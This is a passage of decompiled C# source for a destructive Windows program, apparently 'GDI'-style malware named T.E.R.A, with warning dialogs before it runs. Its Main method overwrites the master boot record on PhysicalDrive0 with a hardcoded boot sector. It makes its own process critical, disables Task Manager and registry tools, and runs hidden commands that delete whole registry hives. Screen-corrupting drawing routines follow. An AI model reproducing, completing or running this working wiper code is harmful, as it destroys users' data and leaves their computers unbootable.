				binaryWriter.Write(1);
				int num = 1;
				int num2 = 8;
				binaryWriter.Write((ushort)num);
				binaryWriter.Write((uint)hz);
				binaryWriter.Write((uint)(hz * num * num2 / 8));
				binaryWriter.Write((ushort)(num * num2 / 8));
				binaryWriter.Write((ushort)num2);
				binaryWriter.Write("data".ToCharArray());
				byte[] array = new byte[hz * secs];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)(i / 8 >> (i >> 5) * i / (((i >> 4) & 3) + 4));
				}
				binaryWriter.Write((uint)(array.Length * num * num2 / 8));
				foreach (byte b in array)
				{
					binaryWriter.Write(b);
				}
				binaryWriter.Seek(4, SeekOrigin.Begin);
				binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8L));
				memoryStream.Seek(0L, SeekOrigin.Begin);
				new SoundPlayer(memoryStream).PlaySync();
			}
		}

		// Token: 0x06000026 RID: 38
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000027 RID: 39
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern bool ShowWindow(int hWnd, int cmdShow);

		// Token: 0x06000028 RID: 40 RVA: 0x0000480C File Offset: 0x00002A0C
		public static bool IsAdministrator()
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00004838 File Offset: 0x00002A38
		[STAThread]
		private static void Main()
		{
			Random random = new Random();
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			GDI.Drawer drawer = new GDI.ReDrawer();
			GDI.Drawer drawer2 = new GDI.randomdrawer();
			GDI.Drawer drawer3 = new GDI.randomdrawer1();
			GDI.Drawer drawer4 = new GDI.Window();
			GDI.Drawer drawer5 = new GDI.Cur();
			GDI.Drawer drawer6 = new GDI.Windowtext();
			GDI.Drawer drawer7 = new GDI.Type();
			GDI.Drawer drawer8 = new GDI.Open();
			GDI.Drawer drawer9 = new GDI.SendM();
			GDI.Drawer drawer10 = new GDI.createfiles();
			GDI.Drawer drawer11 = new GDI.msg();
			GDI.Drawer drawer12 = new GDI.bb();
			GDI.Drawer drawer13 = new GDI.ends();
			bool flag = MessageBox.Show("YOUR ABOUT TO RUN A MALWARE CALLED TERA PLUS RBG.EXE. \n\r\n Use this Malware wisely this will cause data loss and makes your computer likely unbootable and wipe the c: drive. \n\r\n if you dont know what this malware does just click no to make your computer safe. do you want to execute this malware? you wont be able to use windows again! \n\r\n WARNING: THIS MALWARE COUNTAINS FLASHING LIGHTS AND LOUD NOISES.", "T.E.R.A GREEN BLUE RED", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes;
			if (flag)
			{
				bool flag2 = MessageBox.Show(" THIS IS THE FINAL WARNING. \n\r\n if you have read the previous warning then... KEEP IN MIND YOUR PC IS GOING TO BE DESTROYED. CLICK YES DESTROYS YOUR PC. YOU WONT BE ABLE TO USE WINDOWS AGAIN. \n\r\n Creator KozaResponding2 IS NOT RESPONSIBLE FOR ANY DATA LOSS OR MADE DAMAGE TO YOUR COMPUTER. \n\r\n do you still want to execute this malware? this is your final chance to get rid of the program.", "T.E.R.A FINAL WARNING...", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes;
				if (flag2)
				{
					byte[] array = new byte[]
					{
						250, 49, 192, 142, 208, 188, 0, 124, 251, 14,
						31, 184, 19, 0, 205, 16, 184, 0, 160, 142,
						192, 186, 200, 3, 48, 192, 238, 66, 185, 0,
						1, 49, 219, 190, 114, 125, 136, 216, 36, 63,
						48, 228, 1, 198, 172, 136, 196, 136, 194, 208,
						234, 48, 192, 238, 136, 224, 238, 136, 208, 238,
						254, 195, 226, 225, 49, byte.MaxValue, 48, 246, 185, 64,
						1, 48, 210, 136, 208, 42, 6, 46, 125, 136,
						244, 42, 38, 47, 125, 168, 128, 116, 2, 246,
						216, 246, 196, 128, 116, 2, 246, 220, 0, 224,
						36, 63, 187, 50, 125, 215, 136, 195, 136, 208,
						42, 6, 48, 125, 136, 244, 42, 38, 49, 125,
						168, 128, 116, 2, 246, 216, 246, 196, 128, 116,
						2, 246, 220, 0, 224, 36, 63, 215, 0, 216,
						2, 6, 43, 125, 170, 254, 194, 226, 180, 254,
						198, 128, 254, 200, 114, 168, 180, 2, 183, 0,
						182, 24, 138, 22, 44, 125, 205, 16, 180, 14,
						138, 30, 45, 125, 232, 35, 0, 254, 6, 41,
						125, 254, 6, 42, 125, 254, 6, 43, 125, 254,
						6, 45, 125, 254, 6, 46, 125, 254, 14, 47,
						125, 254, 14, 48, 125, 254, 6, 49, 125, 233,
						108, byte.MaxValue, 254, 6, 23, 125, 128, 62, 23, 125,
						5, 114, 55, 198, 6, 23, 125, 0, 138, 30,
						24, 125, 48, byte.MaxValue, 190, 25, 125, 1, 222, 1,
						222, 173, 9, 192, 117, 9, 198, 6, 24, 125,
						0, 190, 25, 125, 173, 186, 67, 0, 176, 182,
						238, 186, 66, 0, 238, 136, 224, 238, 228, 97,
						12, 3, 230, 97, 254, 6, 24, 125, 195, 0,
						0, 77, 13, 218, 11, 247, 9, 47, 11, 225,
						8, 247, 9, 119, 7, 0, 0, 0, 0, 0,
						0, 1, 80, 50, 240, 150, 32, 35, 38, 41,
						44, 47, 49, 52, 54, 56, 58, 59, 60, 61,
						61, 62, 62, 62, 61, 61, 60, 59, 58, 56,
						54, 52, 49, 47, 44, 41, 38, 35, 32, 29,
						26, 23, 20, 17, 15, 12, 10, 8, 6, 5,
						4, 3, 3, 2, 2, 2, 3, 3, 4, 5,
						6, 8, 10, 12, 15, 17, 20, 23, 26, 29,
						32, 35, 38, 41, 44, 47, 49, 52, 54, 56,
						58, 59, 60, 61, 61, 62, 62, 62, 61, 61,
						60, 59, 58, 56, 54, 52, 49, 47, 44, 41,
						38, 35, 32, 29, 26, 23, 20, 17, 15, 12,
						10, 8, 6, 5, 4, 3, 3, 2, 2, 2,
						3, 3, 4, 5, 6, 8, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						85, 170
					};
					IntPtr intPtr = GDI.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
					uint num;
					GDI.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
					int num2 = 1;
					int num3 = 29;
					Process.EnterDebugMode();
					GDI.NtSetInformationProcess(Process.GetCurrentProcess().Handle, num3, ref num2, 4);
					try
					{
						RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
						registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
					}
					catch
					{
					}
					try
					{
						RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
						registryKey2.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
					}
					catch
					{
					}
					try
					{
						int num4 = GDI.FindWindow("Shell_TrayWnd", "");
						GDI.ShowWindow(num4, 0);
					}
					catch
					{
					}
					Thread.Sleep(3000);
					drawer11.Start();
					drawer13.Start();
					try
					{
						string text = "reg delete HKCR /f";
						ProcessStartInfo processStartInfo = new ProcessStartInfo
						{
							FileName = "cmd.exe",
							Arguments = "/C " + text,
							Verb = "runas",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							UseShellExecute = false
						};
						Process.Start(processStartInfo);
					}
					catch
					{
					}
					try
					{
						string text2 = "reg delete HKU /f";
						ProcessStartInfo processStartInfo2 = new ProcessStartInfo
						{
							FileName = "cmd.exe",
							Arguments = "/C " + text2,
							Verb = "runas",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							UseShellExecute = false
						};
						Process.Start(processStartInfo2);
					}
					catch
					{
					}
					try
					{
						string text3 = "reg delete HKCC /f";
						ProcessStartInfo processStartInfo3 = new ProcessStartInfo
						{
							FileName = "cmd.exe",
							Arguments = "/C " + text3,
							Verb = "runas",
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							UseShellExecute = false
						};
						Process.Start(processStartInfo3);
					}
					catch
					{
					}
					try
					{
						int num5 = GDI.FindWindow("Shell_TrayWnd", "");
						GDI.ShowWindow(num5, 0);
					}
					catch
					{
					}
					bool flag3 = !GDI.IsAdministrator();
					if (flag3)
					{
						MessageBox.Show("you must run as administrator to work. 1920x1080 can run easier and fast.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						Environment.Exit(0);
					}
					Thread.Sleep(1000);
					drawer.Start();
					drawer2.Start();
					drawer3.Start();
					drawer12.Start();
					drawer4.Start();
					drawer5.Start();
					drawer6.Start();
					drawer7.Start();
					drawer8.Start();
					drawer9.Start();
					drawer10.Start();
				}
			}
		}

		// Token: 0x0600002A RID: 42
		[DllImport("gdi32.dll")]
		public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

		// Token: 0x0600002B RID: 43
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateSolidBrush(uint crColor);

		// Token: 0x0600002C RID: 44
		[DllImport("gdi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DeleteObject([In] IntPtr hObject);

		// Token: 0x0600002D RID: 45
		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr hdc(IntPtr hWnd);

		// Token: 0x0600002E RID: 46
		[DllImport("user32.dll")]
		private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x0600002F RID: 47
		[DllImport("gdi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

		// Token: 0x06000030 RID: 48
		[DllImport("gdi32.dll")]
		private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

		// Token: 0x06000031 RID: 49
		[DllImport("user32.dll")]
		private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, GDI.RedrawWindowFlags flags);

		// Token: 0x06000032 RID: 50
		[DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

		// Token: 0x06000033 RID: 51
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

		// Token: 0x06000034 RID: 52
		[DllImport("msimg32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, GDI._BLENDFUNCTION ftn);

		// Token: 0x06000035 RID: 53
		[DllImport("gdi32.dll")]
		private static extern bool PlgBlt(IntPtr hdcDest, GDI.POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

		// Token: 0x06000036 RID: 54
		[DllImport("gdi32.dll")]
		private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, GDI.TernaryRasterOperations dwRop);

		// Token: 0x06000037 RID: 55
		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();

		// Token: 0x06000038 RID: 56
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowDC(IntPtr hWnd);

		// Token: 0x06000039 RID: 57
		[DllImport("Gdi32")]
		public static extern long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, [Out] IntPtr lpvBits);

		// Token: 0x0600003A RID: 58
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(IntPtr hbmp, int cBytes, IntPtr lpvBits);

		// Token: 0x0600003B RID: 59
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);

		// Token: 0x0600003C RID: 60
		[DllImport("kernel32")]
		public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		// Token: 0x0600003D RID: 61
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

		// Token: 0x0600003E RID: 62
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x0600003F RID: 63
		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000040 RID: 64
		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberBytesWritten, IntPtr lpOverlapped);

		// Token: 0x06000041 RID: 65
		[DllImport("user32.dll")]
		private static extern int GetFocus();

		// Token: 0x06000042 RID: 66
		[DllImport("user32.dll")]
		private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

		// Token: 0x06000043 RID: 67
		[DllImport("kernel32.dll")]
		private static extern uint GetCurrentThreadId();

		// Token: 0x06000044 RID: 68
		[DllImport("user32.dll")]
		private static extern uint GetWindowThreadProcessId(int hWnd, int ProcessId);

		// Token: 0x06000045 RID: 69
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int SendMessage(int hWnd, int Msg, int wParam, StringBuilder lParam);

		// Token: 0x06000046 RID: 70
		[DllImport("gdi32.dll")]
		private static extern bool DeleteDC(IntPtr hdc);

		// Token: 0x06000047 RID: 71
		[DllImport("user32.dll")]
		private static extern int GetSystemMetrics(int nIndex);

		// Token: 0x06000048 RID: 72
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateSolidBrush(IntPtr colorRef);

		// Token: 0x06000049 RID: 73
		[DllImport("user32.dll")]
		private static extern int FillRect(IntPtr hdc, ref GDI.RECT lprc, IntPtr hbr);

		// Token: 0x0600004A RID: 74
		[DllImport("msimg32.dll")]
		private static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, GDI.BLENDFUNCTION blendFunction);

		// Token: 0x0600004B RID: 75
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x0600004C RID: 76
		[DllImport("gdi32.dll")]
		private static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, [Out] byte[] lpvBits, ref GDI.BITMAPINFO lpbi, uint uUsage);

		// Token: 0x0600004D RID: 77
		[DllImport("gdi32.dll")]
		private static extern int SetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, byte[] lpvBits, ref GDI.BITMAPINFO lpbi, uint uUsage);

		// Token: 0x0600004E RID: 78
		[DllImport("gdi32.dll")]
		private static extern uint GetPixel(IntPtr hdc, int x, int y);

		// Token: 0x0600004F RID: 79
		[DllImport("gdi32.dll")]
		private static extern bool SetPixelV(IntPtr hdc, int x, int y, uint color);

		// Token: 0x04000006 RID: 6
		private const int MOUSEEVENTF_LEFTDOWN = 2;

		// Token: 0x04000007 RID: 7
		private const int MOUSEEVENTF_LEFTUP = 4;

		// Token: 0x04000008 RID: 8
		private const int MOUSEEVENTF_RIGHTDOWN = 8;

		// Token: 0x04000009 RID: 9
		private const int MOUSEEVENTF_RIGHTUP = 16;

		// Token: 0x0400000A RID: 10
		private static Random random = new Random();

		// Token: 0x0400000B RID: 11
		private const int SW_HIDE = 0;

		// Token: 0x0400000C RID: 12
		private const int SW_SHOW = 1;

		// Token: 0x0400000D RID: 13
		public const int AC_SRC_OVER = 0;

		// Token: 0x0400000E RID: 14
		private const uint GenericRead = 2147483648U;

		// Token: 0x0400000F RID: 15
		private const uint GenericWrite = 1073741824U;

		// Token: 0x04000010 RID: 16
		private const uint GenericExecute = 536870912U;

		// Token: 0x04000011 RID: 17
		private const uint GenericAll = 268435456U;

		// Token: 0x04000012 RID: 18
		private const uint FileShareRead = 1U;

		// Token: 0x04000013 RID: 19
		private const uint FileShareWrite = 2U;

		// Token: 0x04000014 RID: 20
		private const uint OpenExisting = 3U;

		// Token: 0x04000015 RID: 21
		private const uint FileFlagDeleteOnClose = 1073741824U;

		// Token: 0x04000016 RID: 22
		private const uint MbrSize = 512U;

		// Token: 0x04000017 RID: 23
		private const int BI_RGB = 0;

		// Token: 0x04000018 RID: 24
		private const int DIB_RGB_COLORS = 0;

		// Token: 0x04000019 RID: 25
		private const int SRCCOPY = 13369376;

		// Token: 0x0200000A RID: 10
		private class ReDrawer : GDI.Drawer
		{
			// Token: 0x0600005E RID: 94 RVA: 0x00004D3C File Offset: 0x00002F3C
			public override void Draw(IntPtr hdc)
			{
				for (int i = 0; i < 3; i++)
				{
					base.Redraw();
				}
				Thread.Sleep(this.random.Next(7500));
			}

			// Token: 0x04000025 RID: 37
			private int redrawCounter;
		}

		// Token: 0x0200000B RID: 11
		private class Drawer1 : GDI.Drawer
		{
			// Token: 0x06000060 RID: 96 RVA: 0x00004D84 File Offset: 0x00002F84
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Graphics graphics = Graphics.FromHdc(hdc);
					global::System.Type typeFromHandle = typeof(Cursors);
					PropertyInfo[] properties = typeFromHandle.GetProperties(BindingFlags.Static | BindingFlags.Public);
					foreach (PropertyInfo propertyInfo in properties)
					{
						Point point = new Point(this.random.Next(this.screenW), this.random.Next(this.screenH));
						Cursor cursor = (Cursor)propertyInfo.GetValue(null, null);
						cursor.Draw(graphics, new Rectangle(point, cursor.Size));
						Thread.Sleep(this.random.Next(2));
					}
					graphics.Dispose();
				}
				catch
				{
				}
			}

			// Token: 0x04000026 RID: 38
			private int redrawCounter;
		}

		// Token: 0x0200000C RID: 12
		private class Drawer2 : GDI.Drawer
		{
			// Token: 0x06000062 RID: 98 RVA: 0x00004E58 File Offset: 0x00003058
			public override void Draw(IntPtr hdc)
			{
				try
				{
					Graphics graphics = Graphics.FromHdc(hdc);
					Bitmap bitmap = this.app.ToBitmap();
					Bitmap bitmap2 = this.warn_ico.ToBitmap();
					Bitmap bitmap3 = this.no_ico.ToBitmap();
					graphics.DrawImage(bitmap, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(600), this.random.Next(590));
					graphics.DrawImage(bitmap2, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(700), this.random.Next(710));
					graphics.DrawImage(bitmap3, this.random.Next(this.screenW), this.random.Next(this.screenH), this.random.Next(500), this.random.Next(500));
				}
				catch
				{
				}
				Thread.Sleep(this.random.Next(1));
			}

			// Token: 0x04000027 RID: 39
			private int redrawCounter;

			// Token: 0x04000028 RID: 40
			private Icon app = GDI.Extract("user32.dll", 5, true);

			// Token: 0x04000029 RID: 41
			private Icon warn_ico = GDI.Extract("user32.dll", 1, true);

			// Token: 0x0400002A RID: 42
			private Icon no_ico = GDI.Extract("user32.dll", 3, true);
		}

		// Token: 0x0200000D RID: 13
		private class Drawer3 : GDI.Drawer
		{
			// Token: 0x06000064 RID: 100 RVA: 0x00004FE8 File Offset: 0x000031E8
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					Graphics graphics = Graphics.FromHdc(intPtr);
					graphics.RotateTransform((float)this.random.Next(360));
					Brush brush = new SolidBrush(Color.FromArgb(this.random.Next(255), this.random.Next(255), this.random.Next(255)));
					graphics.DrawString("T.E.R.A Tr0jan", new Font(FontFamily.GenericSansSerif, (float)this.random.Next(1, 100)), brush, (float)this.random.Next(this.screenW), (float)this.random.Next(this.screenH));
					graphics.DrawString("its too late", new Font(FontFamily.GenericSansSerif, (float)this.random.Next(1, 100)), brush, (float)this.random.Next(this.screenW), (float)this.random.Next(this.screenH));
					graphics.DrawString("you are my doom", new Font(FontFamily.GenericSansSerif, (float)this.random.Next(1, 100)), brush, (float)this.random.Next(this.screenW), (float)this.random.Next(this.screenH));
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, this.random.Next(-1, 2), this.random.Next(-1, 2), 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
				}
				catch
				{
				}
				Thread.Sleep(this.random.Next(2));
			}

			// Token: 0x0400002B RID: 43
			private int redrawCounter;
		}

		// Token: 0x0200000E RID: 14
		public struct RGB
		{
			// Token: 0x06000066 RID: 102 RVA: 0x000051F1 File Offset: 0x000033F1
			public RGB(byte r, byte g, byte b)
			{
				this._r = r;
				this._g = g;
				this._b = b;
			}

			// Token: 0x17000005 RID: 5
			// (get) Token: 0x06000067 RID: 103 RVA: 0x0000520C File Offset: 0x0000340C
			// (set) Token: 0x06000068 RID: 104 RVA: 0x00005224 File Offset: 0x00003424
			public byte R
			{
				get
				{
					return this._r;
				}
				set
				{
					this._r = value;
				}
			}

			// Token: 0x17000006 RID: 6
			// (get) Token: 0x06000069 RID: 105 RVA: 0x00005230 File Offset: 0x00003430
			// (set) Token: 0x0600006A RID: 106 RVA: 0x00005248 File Offset: 0x00003448
			public byte G
			{
				get
				{
					return this._g;
				}
				set
				{
					this._g = value;
				}
			}

			// Token: 0x17000007 RID: 7
			// (get) Token: 0x0600006B RID: 107 RVA: 0x00005254 File Offset: 0x00003454
			// (set) Token: 0x0600006C RID: 108 RVA: 0x0000526C File Offset: 0x0000346C
			public byte B
			{
				get
				{
					return this._b;
				}
				set
				{
					this._b = value;
				}
			}

			// Token: 0x0600006D RID: 109 RVA: 0x00005278 File Offset: 0x00003478
			public bool Equals(GDI.RGB rgb)
			{
				return this.R == rgb.R && this.G == rgb.G && this.B == rgb.B;
			}

			// Token: 0x0400002C RID: 44
			internal static object Properties;

			// Token: 0x0400002D RID: 45
			private byte _r;

			// Token: 0x0400002E RID: 46
			private byte _g;

			// Token: 0x0400002F RID: 47
			private byte _b;
		}

		// Token: 0x0200000F RID: 15
		public struct HSL
		{
			// Token: 0x0600006E RID: 110 RVA: 0x000052BA File Offset: 0x000034BA
			public HSL(int h, float s, float l)
			{
				this._h = h;
				this._s = s;
				this._l = l;
			}

			// Token: 0x17000008 RID: 8
			// (get) Token: 0x0600006F RID: 111 RVA: 0x000052D4 File Offset: 0x000034D4
			// (set) Token: 0x06000070 RID: 112 RVA: 0x000052EC File Offset: 0x000034EC
			public int H
			{
				get
				{
					return this._h;
				}
				set
				{
					this._h = value;
				}
			}

			// Token: 0x17000009 RID: 9
			// (get) Token: 0x06000071 RID: 113 RVA: 0x000052F8 File Offset: 0x000034F8
			// (set) Token: 0x06000072 RID: 114 RVA: 0x00005310 File Offset: 0x00003510
			public float S
			{
				get
				{
					return this._s;
				}
				set
				{
					this._s = value;
				}
			}

			// Token: 0x1700000A RID: 10
			// (get) Token: 0x06000073 RID: 115 RVA: 0x0000531C File Offset: 0x0000351C
			// (set) Token: 0x06000074 RID: 116 RVA: 0x00005334 File Offset: 0x00003534
			public float L
			{
				get
				{
					return this._l;
				}
				set
				{
					this._l = value;
				}
			}

			// Token: 0x06000075 RID: 117 RVA: 0x00005340 File Offset: 0x00003540
			public bool Equals(GDI.HSL hsl)
			{
				return this.H == hsl.H && this.S == hsl.S && this.L == hsl.L;
			}

			// Token: 0x04000030 RID: 48
			private int _h;

			// Token: 0x04000031 RID: 49
			private float _s;

			// Token: 0x04000032 RID: 50
			private float _l;
		}

		// Token: 0x02000010 RID: 16
		private class Drawer4 : GDI.Drawer
		{
			// Token: 0x06000076 RID: 118 RVA: 0x00005384 File Offset: 0x00003584
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					Graphics graphics = Graphics.FromHdc(intPtr);
					double num = (double)(Screen.PrimaryScreen.Bounds.Width / 10);
					int num2 = Screen.PrimaryScreen.Bounds.Height / 10;
					float num3 = 0f;
					float num4 = 0f;
					float num5 = 10f;
					float num6 = 0f;
					while ((double)num6 < num)
					{
						float num7 = (float)Math.Sin((double)num6);
						this.redrawCounter++;
						int num8 = this.redrawCounter;
						int num9 = (int)(num3 * num5 + num4);
						GDI.BitBlt(intPtr, num8, num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, -this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						bool flag = this.redrawCounter >= this.screenW;
						if (flag)
						{
							this.redrawCounter = 0;
						}
						num3 = num7;
						num6 += 0.1f;
					}
					GDI.Drawer4.ballPosX += GDI.Drawer4.moveStepX;
					bool flag2 = GDI.Drawer4.ballPosX < 0 || GDI.Drawer4.ballPosX + GDI.Drawer4.ballWidth > this.screenW;
					if (flag2)
					{
						GDI.Drawer4.moveStepX = -GDI.Drawer4.moveStepX;
					}
					GDI.Drawer4.ballPosY += GDI.Drawer4.moveStepY;
					bool flag3 = GDI.Drawer4.ballPosY < 0 || GDI.Drawer4.ballPosY + GDI.Drawer4.ballHeight > this.screenH;
					if (flag3)
					{
						GDI.Drawer4.moveStepY = -GDI.Drawer4.moveStepY;
					}
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 120, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					Brush brush = new SolidBrush(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B));
					Pen pen = new Pen(Color.Red);
					graphics.FillEllipse(brush, GDI.Drawer4.ballPosX, GDI.Drawer4.ballPosY, GDI.Drawer4.ballWidth, GDI.Drawer4.ballHeight);
					for (int i = 0; i < 100; i += 10)
					{
						graphics.DrawEllipse(pen, GDI.Drawer4.ballPosX - i / 2, GDI.Drawer4.ballPosY - i / 2, GDI.Drawer4.ballWidth + i, GDI.Drawer4.ballHeight + i);
					}
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000033 RID: 51
			private int redrawCounter;

			// Token: 0x04000034 RID: 52
			private static Random r = new Random();

			// Token: 0x04000035 RID: 53
			private int cc;

			// Token: 0x04000036 RID: 54
			private static int ballWidth = 200;

			// Token: 0x04000037 RID: 55
			private static int ballHeight = 200;

			// Token: 0x04000038 RID: 56
			private static int ballPosX = GDI.Drawer4.r.Next(Screen.PrimaryScreen.Bounds.Width - 200);

			// Token: 0x04000039 RID: 57
			private static int ballPosY = GDI.Drawer4.r.Next(Screen.PrimaryScreen.Bounds.Height - 200);

			// Token: 0x0400003A RID: 58
			private static int moveStepX = 10;

			// Token: 0x0400003B RID: 59
			private static int moveStepY = 10;
		}

		// Token: 0x02000011 RID: 17
		private class Drawer5 : GDI.Drawer
		{
			// Token: 0x06000079 RID: 121 RVA: 0x00005730 File Offset: 0x00003930
			public override void Draw(IntPtr hdc)
			{
				try
				{
					double num = (double)Environment.TickCount * 0.002;
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					for (int i = 0; i < this.screenH; i++)
					{
						double num2 = Math.Sin((double)i * 0.02 + num) * 30.0;
						int num3 = (int)num2;
						GDI.BitBlt(intPtr, num3, i, this.screenW, 1, intPtr, 0, i, 13369376);
						double num4 = (Math.Sin(num + (double)i * 0.01) * 0.5 + 0.5) * 255.0;
						double num5 = (Math.Sin(num + (double)i * 0.01 + 2.094) * 0.5 + 0.5) * 255.0;
						double num6 = (Math.Sin(num + (double)i * 0.01 + 4.188) * 0.5 + 0.5) * 255.0;
						byte b = (byte)num4;
						byte b2 = (byte)num5;
						byte b3 = (byte)num6;
						for (int j = 0; j < this.screenW; j += 3)
						{
							uint pixel = GDI.GetPixel(intPtr, j, i);
